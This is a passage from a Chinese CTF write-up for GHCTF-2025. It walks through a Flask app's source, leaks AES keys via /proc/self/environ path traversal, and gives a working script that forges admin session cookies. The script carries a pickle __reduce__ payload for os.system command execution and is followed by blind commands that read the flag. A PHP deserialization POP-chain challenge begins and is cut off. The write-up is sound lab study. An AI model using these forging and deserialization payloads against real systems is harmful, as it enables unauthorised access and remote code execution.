class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:  <span class="comment">#要求为POST方法</span></span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>) </span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="comment">#可以输入username和password</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password: <span class="comment">#输入的password等于username的</span></span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>)) <span class="comment">#重定向到/路由</span></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username)) <span class="comment">#设置一个cookie，跟进create_session方法</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>create_session方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data) <span class="comment"># session_data为注入点</span></span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment"># base64编码</span></span><br><span class="line"></span><br><span class="line">    key, iv = generate_key_iv() <span class="comment"># 跟进generate_key_iv</span></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>) <span class="comment">#跟进aes_encrypt_decrypt方法，其实也不用分析aes_encrypt_decrypt方法。其就是用于加密解密。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br></pre></td></tr></table></figure><p>generate_key_iv方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode() <span class="comment">#从环境中获取secret_key</span></span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode() <span class="comment">#从环境中获取secret_iv</span></span><br><span class="line">    <span class="keyword">return</span> key, iv <span class="comment">#返回key 和 iv 回归到create_session方法</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/路由filename输入/proc/self/environ,获取环境变量。</span></span><br><span class="line"><span class="string">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span></span><br><span class="line"><span class="string">SECRET_iv=asdwdggiouewhgpw</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>接着分析&#x2F;路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>]) <span class="comment"># 跟进validate_session ;注入点在这里</span></span><br><span class="line">        <span class="keyword">if</span> session: <span class="comment">#存在</span></span><br><span class="line">            data = <span class="string">&quot;&quot;</span></span><br><span class="line">            filename = request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> filename:</span><br><span class="line">                data = dowload_file(filename) <span class="comment"># 跟进dowload_file;用于读取文件并显示出来</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=session[<span class="string">&#x27;username&#x27;</span>], file_data=data)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>) <span class="comment"># 重定向到/login路由</span></span><br></pre></td></tr></table></figure><p>validate_session方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv() <span class="comment"># 从环境变量中获取key和iv</span></span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv, mode=<span class="string">&#x27;decrypt&#x27;</span>) <span class="comment"># 解密</span></span><br><span class="line">        pickled_data = base64.b64decode(pickled) <span class="comment"># base64 解码</span></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data) <span class="comment"># 这里进行了pickle 反序列化 ，只要在这一步完成恶意代码执行就可以</span></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>: <span class="comment">#session_data的username键必须为admin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span> <span class="comment"># 这里判断session是否过期；返回/路由</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>dowload_file方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path = os.path.join(<span class="string">&quot;static&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">os.path.join：当filename以斜杠开头是，会忽略掉它之前的所有片段将其视为绝对路径。</span></span><br><span class="line"><span class="string">这就是为啥，前面在泄露源码的时候，输入/app/app.py，不是在static目录下，而是在/目录下寻找，返回/目录的文件或文件夹。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>该分析的都分析完了，现在看看如何伪造session；session由create_session方法创造的；create_session方法包含aes_encrypt_decrypt方法；我们将这两个方法写入脚本；再引入需要的库就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> base64, pickle, time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username,key,iv</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>,  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line">    result = create_session(<span class="string">&#x27;admin&#x27;</span>,key,iv)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment">#运行</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-14%20092239.png" class="" title="屏幕截图 2025-06-14 092239"><img src="/CTFwp/GHCTF-2025/image-20250614092356808.png" class="" title="image-20250614092356808"><p>我们看到这个是可以的。</p><p>pickle反序列化，没有禁用R指令，我们使用<code>__reduce__</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> base64, pickle, time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&#x27;sleep 3&#x27;</span>, )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username,key,iv</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>,  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:A() <span class="comment"># 这个是真的神奇</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line">    result = create_session(<span class="string">&#x27;admin&#x27;</span>,key,iv)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-14%20092729.png" class="" title="屏幕截图 2025-06-14 092729"><p>确实可以执行；但是没有回显。</p><p>现在就是无回显命令执行；测试当前目录是否可以写入，发现其确实可以写入。</p><p><code>ls|tee 1</code>执行此命令；接着<code>ls /</code>；</p><img src="/CTFwp/GHCTF-2025/image-20250614093413326.png" class="" title="image-20250614093413326"><p><code>cat /f*|tee 1</code></p><img src="/CTFwp/GHCTF-2025/image-20250614093547211.png" class="" title="image-20250614093547211"><p><strong>题目小结：</strong></p><ol><li>考察python代码审计</li><li>pickle反序列化</li><li>python的无回显命令执行</li></ol><h2 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1; <span class="comment">// 4 fruit1 赋值为 CherryBlossom 的实例化对象，将对象当做字符串用，触发该对象的__toString()方法。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2; <span class="comment">// 3 fruit2 赋值为 Philosopher的实例化对象，将对象当做函数来调用，触发该对象的__invoke方法。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="comment">// 1 利用点在这里</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;  <span class="comment">// 2 fruit10 赋值为 Mystery的实例化对象，该对象并没有hey属性，触发该对象的__get方法。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) 